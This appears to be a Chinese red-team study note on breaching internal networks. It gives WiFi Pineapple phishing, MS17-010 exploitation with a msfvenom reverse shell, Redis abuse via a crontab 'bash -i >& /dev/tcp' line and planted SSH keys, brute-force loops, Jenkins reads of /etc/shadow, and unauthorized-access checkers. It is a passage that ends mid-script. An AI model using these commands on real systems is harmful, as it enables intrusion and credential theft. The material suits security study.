    <content type="html"><![CDATA[<h1 id="二、打点-进入内网"><a href="#二、打点-进入内网" class="headerlink" title="二、打点-进入内网"></a>二、打点-进入内网</h1><div class="note note-primary">            <p>这一章节的内容较多，一时啃不完，部分内容粗略带过，后续有时间再单独写笔记</p>          </div><h2 id="1、外部接入点-WiFi"><a href="#1、外部接入点-WiFi" class="headerlink" title="1、外部接入点-WiFi"></a>1、外部接入点-WiFi</h2><h3 id="无线攻击实战应用之-DNSSpoof、Evil-Portal、DWall组合拳入侵（配合）"><a href="#无线攻击实战应用之-DNSSpoof、Evil-Portal、DWall组合拳入侵（配合）" class="headerlink" title="无线攻击实战应用之 DNSSpoof、Evil Portal、DWall组合拳入侵（配合）"></a>无线攻击实战应用之 DNSSpoof、Evil Portal、DWall组合拳入侵（配合）</h3><p>前言：主要向大家介绍 <code>WiFi Pineapple</code>（以下简称“菠萝”）设备的基本使用方法，以及通过菠萝中的几个模块达到中间人攻击，网站钓鱼和获得shell。文章中主要使用到<code>DWall</code>、<code>Evil Portal</code>与<code>DNSMasq Spoofv</code>三个模块</p><p>Pineapple开启与网络桥接将菠萝的按钮由off划到wifi标志，稍等片刻便会向周围发射两个无线信号。一个无线信号是菠萝的管理ap，一个是给受害者使用的开放ap。这两个ap的ssid以及管理ap的密码均可以在菠萝的web管理界面中设置</p><p><a href="http://www.wifipi.org:8080/WiFiPineapple-%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C-V1.3.pdf">http://www.wifipi.org:8080/WiFiPineapple-用户手册-V1.3.pdf</a><br><a href="https://shop.hak5.org/products/wifi-pineapple">https://shop.hak5.org/products/wifi-pineapple</a></p><p>参考该资料以及购买菠萝设备连接！</p><p>由于穷，买不起的原因，只能</p><h3 id="简单总结一下利用模块解释："><a href="#简单总结一下利用模块解释：" class="headerlink" title="简单总结一下利用模块解释："></a>简单总结一下利用模块解释：</h3><h4 id="Evil-Portal"><a href="#Evil-Portal" class="headerlink" title="Evil Portal"></a><strong>Evil Portal</strong></h4><p>可以利用Evil Portal模块获取TP-LINK管理员密码，它的作用是可以使接入用户在访问任意网站时都跳转到我们事先设置好的 Landing page中。 Landing Page是设置菠萝网关的页面，此处我们重定向到公网上一台配置好钓鱼网站的vps上，也可给菠萝添加一张sd卡，直接将钓鱼网站文件放置到菠萝中</p><h4 id="Dwall"><a href="#Dwall" class="headerlink" title="Dwall"></a><strong>Dwall</strong></h4><p>使用DWall进行中间人攻击DWall中文名称叫”绵羊墙”，是菠萝中的一个默认安装模块，它可以嗅探已连接客户端的所有HTTP请求，如URLS、Cookies、Post Data，以及实时地显示出客户端正在浏览的图片等</p><h4 id="DNSSpoof"><a href="#DNSSpoof" class="headerlink" title="DNSSpoof"></a><strong>DNSSpoof</strong></h4><p>此处使用到菠萝中的 DNSMasq spoc模块。它的作用是dns劫持，获取到受害客户端的域名解析控制权。我们可以在hosts中设置想要进行欺骗的域名，当用户输入该域名后，模块会欺骗用户将域名解析成设置好的IP，此处我们设置跳转到菠萝网关上</p><p>DNSSpoof模块可以尝试获取shell，可以尝试使受害者重定向到一台公网上的vps来下载木马文件，诱导受害者点击。木马文件可精心构造，比如具有欺骗性的文件名，免杀木马等。</p><h4 id="DNS欺骗原理"><a href="#DNS欺骗原理" class="headerlink" title="DNS欺骗原理"></a><strong>DNS欺骗原理</strong></h4><p>DNS服务器工作原理是，存储IP地址到DNS名称映射的记录（称为资源记录）数据库，联系这些资源记录与客户端，并将这些资源记录与其他DNS服务器联系。而客户端对于每个通过互联网发送的DNS请求都包含一个独特的识别码，其目的在于辨识查询和响应，并将对应的查询和响应配对在起。这就意味着，如果我们可以拦截客户端发送的DNS请求包，做一个包含该识别码的假数据包，这样目标计算机就会根据识别码认为这个假数据包就是其需要的结果，从而接受我们发送的包。这里尝试使用nslookup查看域名解析情况，用tracert命令跟踪：无修改，dns欺骗，配置静态dns，三种情况下访问测试域名的路由情况</p><h3 id="防护意见"><a href="#防护意见" class="headerlink" title="防护意见"></a>防护意见</h3><ul><li>配置静态可靠的dns </li><li>将访问的重要域名与P地址进行绑定</li><li>提高安全意识,不轻易连接不可信的、开放的无线热点</li></ul><hr><h2 id="2、应用系统漏洞利用"><a href="#2、应用系统漏洞利用" class="headerlink" title="2、应用系统漏洞利用"></a>2、应用系统漏洞利用</h2><h3 id="常见漏洞扫描"><a href="#常见漏洞扫描" class="headerlink" title="常见漏洞扫描"></a>常见漏洞扫描</h3><h4 id="Nmap扫描漏洞技巧"><a href="#Nmap扫描漏洞技巧" class="headerlink" title="Nmap扫描漏洞技巧"></a>Nmap扫描漏洞技巧</h4><ul><li>auth         处理身份验证 <ul><li>broadcast 网络广播<ul><li>brute 暴力猜解</li><li>default默认</li></ul></li><li>discovery 服务发现<ul><li>dos         拒绝服务</li><li>exploit漏洞利用</li><li>external外部扩展</li><li>fuzzer 模糊测试 </li></ul></li><li>intrusive 扫描可能造成不良后果</li><li>malware 检测后门<ul><li>safe 扫描危害较小</li><li>version 版本识别</li><li>vuln 漏洞检测 </li></ul></li></ul></li></ul><h5 id="通用参数-vuln"><a href="#通用参数-vuln" class="headerlink" title="通用参数 -vuln"></a><strong>通用参数 -vuln</strong></h5><pre><code class="hljs bash">nmap --script=vuln 192.168.1.105</code></pre><h5 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a><strong>MS17-010</strong></h5><pre><code class="hljs bash">nmap --script=smb-vuln-ms17-010 192.168.1.105</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/01.png" alt="MS17-010"></p><hr><h4 id="impacket框架之mssql服务器安全检测"><a href="#impacket框架之mssql服务器安全检测" class="headerlink" title="impacket框架之mssql服务器安全检测"></a>impacket框架之mssql服务器安全检测</h4><p>在实际渗透测试工作中经常会遇到检测项目中mssq服务器安全性,此篇文章介绍 <code>impack</code>框架中 <code>mssqlclient</code>的使用方法。</p><h5 id="mssqlclient与其他工具相比的优势"><a href="#mssqlclient与其他工具相比的优势" class="headerlink" title="mssqlclient与其他工具相比的优势"></a>mssqlclient与其他工具相比的优势</h5><ol><li>跨平台，python脚本编写，并且已有exe版本</li><li>命令行执行，速度快</li><li>支持使用 socks代理传输数据</li><li>支持以hash传递的方式进行账号验证 </li><li>支持 windows认证模式进行mssq服务的安全检测</li><li>执行sq命令可以是交互式,也可以直接回显sq命令执行结果</li></ol><h5 id="win和linux环境下使用"><a href="#win和linux环境下使用" class="headerlink" title="win和linux环境下使用"></a><strong>win和linux环境下使用</strong></h5><p>1）在windows环境下使用windows认证模式，mssqlclient测试登陆sqlserver服务器，账号验证通过后会直接返回 sql shell</p><pre><code class="hljs bash">mssqlclient.exe admin/admin123@192.168.1.105 -windows-auth</code></pre><p>2）通过 socks代理，在linux环境下使用 windows认证模式，mssqlclient测试登陆 sqlserver服务器，账号验证通过后会直接返回 sql shell</p><pre><code class="hljs bash">proxychains python mssqlclient.py sa/admin123@192.168.x.x -windows-auth</code></pre><p>3）通过 socks代理，以mssql账号验证方式测试登陆mssql服务器，账号验证成功后执行mssql. txt内的sql命令</p><pre><code class="hljs bash">proxychains python mssqlclient.py ./sa:admin123@192.168.x.x -file mssql.txt</code></pre><p>4）通过 socks代理，在linux环境下使用 windows认证模式，mssqlclient测试登录sqlserver服务器，账号验证成功后执行 command.txt内的sql命令</p><pre><code class="hljs bash">proxychains python mssqlclient.py -p 1433 admin/sa:admin123@192.168.x.x -windows-auth -file cpmmand.txt</code></pre><p>5）在windows环境下使用windows认证模式，使用ntlm hash验证方式，mssqlclient测试登陆sqlserver服务器，账号验证成功后执行command.txt内的sql命令</p><pre><code class="hljs shell">mssqlclient.exe -p 1433 -hashes :&quot;hash值&quot; admin/sqladmin@192.168.x.x -file command.txt -windows-auth</code></pre><p>同样也可以用于webshell环境下</p><h5 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a><strong>批量检测</strong></h5><p>除此之外，还可以批量检测内网 SQL server服务器的账号安全性<br>需要准备的文件有：</p><ul><li>mssqlclient.exe(必须)</li><li>command.txt(必须) </li></ul><p>以下四个文件需选其一：</p><ul><li>hashes.txt        （需验证的 ntlm hash字符串列表）<ul><li>username.txt （需验证的 username列表）<ul><li>password.txt（需验证的密码字符串列表）<ul><li>Ips.txt （需验证的p字符串列表）</li></ul></li></ul></li></ul></li></ul><p><strong>举例以下几种批量检测的bat脚本内容</strong></p><p>1）测试以 windows认证模式，使用hash传递验证，使用 mssqlclient批量测试登陆 sqlserver服务器，Ips.txt 内容为待检测sqlserver服务ip，每行一条</p><pre><code class="hljs shell">FOR /F %%i in (ips.txt) do mssqlclient.exe -p 1433 -hashes :hash值 ......</code></pre><p>2）测试以 windows认证模式，使用hash传递验证，指定主机 ntlm hash遍历验证，hashes.txt为待检测已知 ntlm hash内容，每行一条</p><pre><code class="hljs shell">FOR /F %%i in (hashes.txt) do mssqlclient.exe -p 1433 -hashes %%i domain/adminis.......</code></pre><p>3）测试以 sqlserver认证模式，指定待检测主机，遍历验证 passwords.txt 内密码有效性，passwords.txt为已知密码内容，每行一条，验证成功后执行 command.txt内sql命令</p><pre><code class="hljs shell">FOR /F %%i in (passwords.txt) do mssqlclient.exe -p 1433 ./sa:%%i@192.168.x.x ....</code></pre><p>4）测试以 sqlserver认证模式，指定待检测密码，遍历验证ip.txt内所有服务器，ip.txt为待检测sqlserver服务器，每行一条，验证成功后执行 command. txt内sql命令</p><pre><code class="hljs shell">FOR /F %%i in (ips.txt) do mssqlclient.exe -p 1433 ./sa:password123@%%1i -file ......</code></pre><p>这四种命令补全查看前面的讲解即可，或者查看参考资料</p><h5 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a><strong>参考资料：</strong></h5><ul><li><a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a>    –下载</li><li><a href="https://www.puckiestyle.nl/impacket/">https://www.puckiestyle.nl/impacket/</a></li><li><a href="https://github.com/SecureAuthCorp/impacket/issues/613">https://github.com/SecureAuthCorp/impacket/issues/613</a></li></ul><hr><h4 id="MS17010py脚本利用"><a href="#MS17010py脚本利用" class="headerlink" title="MS17010py脚本利用"></a>MS17010py脚本利用</h4><h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h5><p>为什么要介绍用py脚本，因为有些机器存在漏洞，但是使用MSF的模块利用失败，而使用py脚本则能成功利用</p><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a><strong>利用</strong></h5><p>在本地用虚拟机搭建了Kail 和 Windows7系统</p><pre><code class="hljs dns">windwos7靶机IP：<span class="hljs-number">192.168.1.105</span>kali：<span class="hljs-number">192.168.1.104</span>操作机：<span class="hljs-number">192.168.1.106</span></code></pre><p><strong>Kali生成木马dll</strong></p><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.1.104 <span class="hljs-attribute">lport</span>=4444 -f dll &gt; 64.dllmsfconsole进入控制台use exploit/multi/handler <span class="hljs-builtin-name">set</span> payload windows/x64/meterpreter/reverse_tcp<span class="hljs-builtin-name">set</span> lhost 192.168.1.104<span class="hljs-builtin-name">set</span> lport 4444run</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/02.png" alt="生成dll文件"></p><p><strong>操作机</strong></p><p>py下载地址：fb.py</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/misterch0c/</span>shadowbroker<span class="hljs-regexp">/tree/m</span>aster/windows</code></pre><p>1)设置ip<br>2)<code>use Eternalblue</code>使用 Eternalblue插件<br>3)<code>use doublepulsar</code>使用 doublepulsar插件<br>4)最后执行dll反弹shell<br>操作步骤不截图了挺简单的…<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/03.png" alt="成功弹回会话"></p><hr><h3 id="未授权访问漏洞"><a href="#未授权访问漏洞" class="headerlink" title="未授权访问漏洞"></a>未授权访问漏洞</h3><p>这类问题覆盖的应用、利用方式较广，因此只举例频次较高的漏洞</p><h4 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a><strong>Redis</strong></h4><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库</p><p><strong>reds-cli</strong></p><pre><code class="hljs bash">redis-cli -h 192.168.1.106 -p 6379</code></pre><p><strong>写入文件</strong></p><pre><code class="hljs bash">redis 192.168.1.106:6379&gt; CONFIG GET dir1) <span class="hljs-string">&quot;dir&quot;</span>2) <span class="hljs-string">&quot;C:\\Users\\Administrator\\Desktop\\Redis\\Redis&quot;</span>redis 192.168.1.106:6379&gt; CONFIG <span class="hljs-built_in">set</span> dir C:/OKredis 192.168.1.106:6379&gt; SET foobar <span class="hljs-string">&quot;who are you? iceH&quot;</span>OKredis 192.168.1.106:6379&gt; CONFIG GET dbfilename1) <span class="hljs-string">&quot;dbfilename&quot;</span>2) <span class="hljs-string">&quot;dump.rdb&quot;</span>redis 192.168.1.106:6379&gt; CONFIG SET dbfilename write_file.logOKredis 192.168.1.106:6379&gt; saveOKredis 192.168.1.106:6379&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/04.png" alt="redis写文件"></p><p><strong>反弹shell-Linux</strong></p><pre><code class="hljs bash">127.0.0.1:6379 &gt; <span class="hljs-built_in">set</span> shell <span class="hljs-string">&quot;\n* * * * *  bash -i &gt;&amp; /dev/tcp/1.1.1.1/88 0&gt;&amp;1\n&quot;</span> OK127.0.0.1:6379 &gt; config <span class="hljs-built_in">set</span> dir /var/spool/cron/OK127.0.0.1:6379 &gt; config <span class="hljs-built_in">set</span> dbfilename root OK127.0.0.1:6379 &gt; save[238] xx May xx:xx:xx DB saved on diskOK</code></pre><p><strong>写入公钥</strong><br>生成公钥：</p><pre><code class="hljs bash">ssh-keygen-t rsa   一直回车即可</code></pre><pre><code class="hljs bash">127.0.0.1:6379 &gt; config <span class="hljs-built_in">set</span> dir /root/.ssh/OK127.0.0.1:6379 &gt; config <span class="hljs-built_in">set</span> dbfilename authorized_keysOK127.0.0.1:6379 &gt; <span class="hljs-built_in">set</span> x <span class="hljs-string">&quot;\n\n\nssh-rsa xxxxxx root@kali\n\n\n&quot;</span>OK127.0.0.1:6379 &gt; saveOK</code></pre><p><strong>清空数据库</strong></p><pre><code class="hljs bash">172.16.x.x:6379 &gt; FLUSHALL</code></pre><hr><h3 id="未授权漏洞总结"><a href="#未授权漏洞总结" class="headerlink" title="未授权漏洞总结"></a>未授权漏洞总结</h3><p>这一部分，书上不咋详细，等有时间我再单独发笔记</p><h4 id="Redis-1"><a href="#Redis-1" class="headerlink" title="Redis"></a>Redis</h4><p><strong>计划任务反弹shell</strong></p><p>利用计划任务执行命令反弹shell</p><p>在<code>redis</code>以<code>root</code>权限运行时可以写<code>crontab</code>来执行命令反弹shell<br>先在自己的服务器上监听一个端口</p><pre><code class="hljs bash">nc -lvnp 8989</code></pre><p>然后执行命令：</p><pre><code class="hljs bash">redis-cli -h 192.168.x.x192.168.x.x:6379 &gt; <span class="hljs-built_in">set</span> x <span class="hljs-string">&quot;\n* * * * *  bash -i &gt;&amp; /dev/tcp/1.1.1.1/8989 0&gt;&amp;1\n&quot;</span>192.168.x.x:6379 &gt; config <span class="hljs-built_in">set</span> dir /var/spool/cron/192.168.x.x:6379 &gt; config <span class="hljs-built_in">set</span> dbfilename root192.168.x.x:6379 &gt; save</code></pre><p><strong>写入公钥</strong><br>获取rsa</p><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span></code></pre><p>将公钥写入foo.txt，注意内容前后要加2个换行</p><pre><code class="hljs lsl">(echo -e <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span>; cat /root/ssh/id_rsa.pub; echo -e <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span>) &gt; foo.txt</code></pre><p>将foo.txt放入键crackit里</p><pre><code class="hljs routeros">cat foo.txt redis-cli -h<span class="hljs-built_in"> IP </span>-x <span class="hljs-builtin-name">set</span> crackit</code></pre><p>连接目标</p><pre><code class="hljs x86asm">redis-<span class="hljs-keyword">cli</span> -h <span class="hljs-built_in">Ip</span></code></pre><p>设置目标的redis的配置文件<br>设置数据库备份目录为/root/.ssh/</p><pre><code class="hljs css">192.168<span class="hljs-selector-class">.X</span><span class="hljs-selector-class">.X</span>: 6379 &gt; <span class="hljs-selector-tag">config</span> <span class="hljs-selector-tag">set</span> <span class="hljs-selector-tag">dir</span> /<span class="hljs-selector-tag">root</span>/<span class="hljs-selector-class">.ssh</span>/</code></pre><p>设置数据库备份文件名为authorized_keys</p><pre><code class="hljs css">192.168<span class="hljs-selector-class">.X</span><span class="hljs-selector-class">.X</span><span class="hljs-selector-pseudo">:6379</span> &gt; <span class="hljs-selector-tag">config</span> <span class="hljs-selector-tag">set</span> <span class="hljs-selector-tag">dbfilename</span> <span class="hljs-selector-tag">authorized_keys</span></code></pre><p>此时公钥成功写入目标机子，文件名为authorized_keys</p><pre><code class="hljs css">192.168<span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span><span class="hljs-selector-pseudo">:6379</span> &gt; <span class="hljs-selector-tag">save</span></code></pre><p>利用私钥链接目标</p><pre><code class="hljs llvm">ssh -i /root/.ssh/id_rsa root<span class="hljs-title">@192</span>.<span class="hljs-number">168</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> set <span class="hljs-keyword">x</span> <span class="hljs-string">&quot;\n\n\n</span></code></pre><p>参考资料：</p><ul><li><a href="https://segmentfault.com/a/1190000009811404">https://segmentfault.com/a/1190000009811404</a></li><li><a href="https://github.com/andymccurdy/redis-py">https://github.com/andymccurdy/redis-py</a></li></ul><hr><h4 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h4><p>默认是8080端口未授权访问就是任意用户都能访问都能执行命令</p><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1:8080</span>/jenkins/manage<span class="hljs-number">127.0.0.1:8080</span>/jenkins/script</code></pre><p><strong>常用命令集合：</strong></p><pre><code class="hljs arduino"><span class="hljs-built_in">println</span> <span class="hljs-string">&quot;whoami&quot;</span>.execute().<span class="hljs-built_in">text</span></code></pre><p><strong>Linux：</strong></p><pre><code class="hljs css"><span class="hljs-selector-tag">println</span> <span class="hljs-selector-tag">ifconifg</span> <span class="hljs-selector-tag">-a</span>&quot;<span class="hljs-selector-class">.execute</span>()<span class="hljs-selector-class">.text</span><span class="hljs-selector-tag">println</span> &quot;<span class="hljs-selector-tag">cat</span> /<span class="hljs-selector-tag">etc</span>/<span class="hljs-selector-tag">passwd</span>&quot;<span class="hljs-selector-class">.execute</span>()<span class="hljs-selector-class">.text</span><span class="hljs-selector-tag">printin</span>&quot;<span class="hljs-selector-tag">cat</span> /<span class="hljs-selector-tag">etc</span>/<span class="hljs-selector-tag">shadow</span>&quot;<span class="hljs-selector-class">.execute</span>()<span class="hljs-selector-class">.text</span></code></pre><p><strong>Windows：</strong></p><pre><code class="hljs gradle"><span class="hljs-keyword">println</span> <span class="hljs-string">&quot;ipconfig /all&quot;</span>.execute().text<span class="hljs-keyword">def</span> sout = <span class="hljs-keyword">new</span> StringBuffer(), serr = <span class="hljs-keyword">new</span> StringBuffer()<span class="hljs-keyword">def</span> proc = <span class="hljs-string">&#x27;ipconfig&#x27;</span>.execute()proc.consumeProcessOutput(sout, serr)proc.<span class="hljs-keyword">waitForOrKill</span>(<span class="hljs-number">1000</span>)<span class="hljs-keyword">println</span> <span class="hljs-string">&quot;out&gt; $sout err&gt; $serr&quot;</span></code></pre><p><strong>更多可参考：</strong></p><p><a href="https://blog.csdn.net/zhangpeng999123/article/details/108227041">https://blog.csdn.net/zhangpeng999123/article/details/108227041</a></p><hr><h4 id="Mongodb"><a href="#Mongodb" class="headerlink" title="Mongodb"></a>Mongodb</h4><p>利用可视化工具连接默认端口：28017<br>推荐Robo3t 1.1 即可</p><p>python mongodb_unauth.py</p><pre><code class="hljs python">coding:utf-<span class="hljs-number">8</span>mongodb未授权检测脚本usage: python3 mongodb_unauth.py ip port默认端口<span class="hljs-number">28017</span>和<span class="hljs-number">27017</span><span class="hljs-keyword">from</span> pymongo <span class="hljs-keyword">import</span> MongoClient<span class="hljs-keyword">import</span> sysip = sys.argv[<span class="hljs-number">1</span>] port = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>]) <span class="hljs-keyword">try</span>:conn = MongoClient(ip, port, socketTimeoutMS=<span class="hljs-number">5000</span>)<span class="hljs-comment">#连接 MongoDB，延时5秒</span>dbs = conn.database_names()print(<span class="hljs-string">&#x27;[ok] -&gt; &#123;&#125;:&#123;&#125; database_names : &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ip, port, dbs))conn.close() <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:error = e.argsprint(<span class="hljs-string">&#x27;[-] -&gt; &#123;&#125;:&#123;&#125; error : &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ip, port, error))</code></pre><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> mongodb_unauth.py <span class="hljs-number">192.168.175.1</span> <span class="hljs-number">27017</span></code></pre><hr><h4 id="ZooKeeper"><a href="#ZooKeeper" class="headerlink" title="ZooKeeper"></a>ZooKeeper</h4><p>默认端口：2181、2171</p><pre><code class="hljs shell">ls / #查看所有节点 get /#获取某个节点信息</code></pre><p>脚本检测</p><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><span class="hljs-keyword">import</span> socket<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_plugin_info</span>():</span>    plugin_info = &#123;        <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Zookeeper未授权访问&quot;</span>,        <span class="hljs-string">&quot;info&quot;</span>: <span class="hljs-string">&quot;Zookeeper Unauthorized access&quot;</span>,        <span class="hljs-string">&quot;level&quot;</span>: <span class="hljs-string">&quot;中危&quot;</span>,        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;未授权访问&quot;</span>,        <span class="hljs-string">&quot;author&quot;</span>: <span class="hljs-string">&quot;c4bbage@qq.com&quot;</span>,        <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://hackerone.com/reports/154369&quot;</span>,        <span class="hljs-string">&quot;keyword&quot;</span>: <span class="hljs-string">&quot;server:Zookeeper&quot;</span>,        <span class="hljs-string">&quot;source&quot;</span>: <span class="hljs-number">1</span>    &#125;    <span class="hljs-keyword">return</span> plugin_info<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">ip, port, timeout</span>):</span>    <span class="hljs-keyword">try</span>:        socket.setdefaulttimeout(timeout)        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        s.connect((ip, <span class="hljs-built_in">int</span>(port)))        flag = <span class="hljs-string">&quot;envi&quot;</span>        <span class="hljs-comment"># envi</span>        <span class="hljs-comment"># dump</span>        <span class="hljs-comment"># reqs</span>        <span class="hljs-comment"># ruok</span>        <span class="hljs-comment"># stat</span>        s.send(flag)        data = s.recv(<span class="hljs-number">1024</span>)        s.close()        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Environment&#x27;</span> <span class="hljs-keyword">in</span> data:            <span class="hljs-keyword">return</span> <span class="hljs-string">u&quot;Zookeeper Unauthorized access&quot;</span>    <span class="hljs-keyword">except</span>:        <span class="hljs-keyword">pass</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>    ip = <span class="hljs-string">&quot;1.1.1.1&quot;</span>    <span class="hljs-built_in">print</span> check(ip, <span class="hljs-number">2181</span>, <span class="hljs-number">2</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    main()</code></pre><p>参考资料：</p><ul><li><a href="https://blog.csdn.net/lihao21/article/details/51778255">https://blog.csdn.net/lihao21/article/details/51778255</a></li><li><a href="https://www.cnblogs.com/wushijin/p/11654076.html">https://www.cnblogs.com/wushijin/p/11654076.html</a></li></ul><hr><h4 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h4><p>默认端口：9200</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">9200</span><span class="hljs-regexp">/_plugin/</span>head/ web管理界面http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">9200</span><span class="hljs-regexp">/_cat/i</span>ndiceshtp:<span class="hljs-regexp">//</span> localhost:<span class="hljs-number">9200</span><span class="hljs-regexp">/_river/</span>_search查看数据库敏感信息http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">9200</span>/_nodes 查看节点数</code></pre><p>脚本检测：</p><p><code>python3 elasticsearch_unauth.py 192.168.1.4 9200</code></p><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8</span><span class="hljs-comment"># elasticsearch未授权检测脚本</span><span class="hljs-comment"># author：ske</span><span class="hljs-comment"># usage: python3 elasticsearch_unauth.py ip port</span><span class="hljs-comment"># 默认端口9200</span><span class="hljs-comment"># http://localhost:9200/_plugin/head/ web管理界面</span><span class="hljs-comment"># http://localhost:9200/_cat/indices</span><span class="hljs-comment"># http://localhost:9200/_river/_search 查看数据库敏感信息</span><span class="hljs-comment"># http://localhost:9200/_nodes 查看节点数据</span><span class="hljs-keyword">import</span> sys<span class="hljs-keyword">from</span> elasticsearch <span class="hljs-keyword">import</span> Elasticsearch<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> jsonip = sys.argv[<span class="hljs-number">1</span>]port = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>]) <span class="hljs-comment"># 9200</span><span class="hljs-keyword">try</span>:    es = Elasticsearch(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(ip, port), timeout=<span class="hljs-number">5</span>)  <span class="hljs-comment"># 连接Elasticsearch,延时5秒</span>    es.indices.create(index=<span class="hljs-string">&#x27;unauth_text&#x27;</span>)    print(<span class="hljs-string">&#x27;[+] 成功连接 ：&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ip))    print(<span class="hljs-string">&#x27;[+] &#123;&#125; -&gt; 成功创建测试节点unauth_text&#x27;</span>.<span class="hljs-built_in">format</span>(ip))    es.index(index=<span class="hljs-string">&quot;unauth_text&quot;</span>, doc_type=<span class="hljs-string">&quot;test-type&quot;</span>, <span class="hljs-built_in">id</span>=<span class="hljs-number">2</span>, body=&#123;<span class="hljs-string">&quot;text&quot;</span>: <span class="hljs-string">&quot;text&quot;</span>&#125;)    print(<span class="hljs-string">&#x27;[+] &#123;&#125; -&gt; 成功往节点unauth_text插入数据&#x27;</span>.<span class="hljs-built_in">format</span>(ip))    ret = es.get(index=<span class="hljs-string">&quot;unauth_text&quot;</span>, doc_type=<span class="hljs-string">&quot;test-type&quot;</span>, <span class="hljs-built_in">id</span>=<span class="hljs-number">2</span>)    print(<span class="hljs-string">&#x27;[+] &#123;&#125; -&gt; 成功获取节点unauth_text数据 : &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ip, ret))    es.indices.delete(index=<span class="hljs-string">&#x27;unauth_text&#x27;</span>)    print(<span class="hljs-string">&#x27;[+] &#123;&#125; -&gt; 清除测试节点unauth_text数据&#x27;</span>.<span class="hljs-built_in">format</span>(ip))    print(<span class="hljs-string">&#x27;[ok] &#123;&#125; -&gt; 存在ElasticSearch未授权漏洞&#x27;</span>.<span class="hljs-built_in">format</span>(ip))    print(<span class="hljs-string">&#x27;尝试获取节点信息：↓&#x27;</span>)    text = json.loads(requests.get(url=<span class="hljs-string">&#x27;http://&#123;&#125;:&#123;&#125;/_nodes&#x27;</span>.<span class="hljs-built_in">format</span>(ip, port), timeout=<span class="hljs-number">5</span>).text)    nodes_total = text[<span class="hljs-string">&#x27;_nodes&#x27;</span>][<span class="hljs-string">&#x27;total&#x27;</span>]    nodes = <span class="hljs-built_in">list</span>(text[<span class="hljs-string">&#x27;nodes&#x27;</span>].keys())    print(<span class="hljs-string">&#x27;[ok] &#123;&#125; -&gt; [&#123;&#125;] : &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ip, nodes_total, nodes))<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:    error = e.args    print(<span class="hljs-string">&#x27;[-] 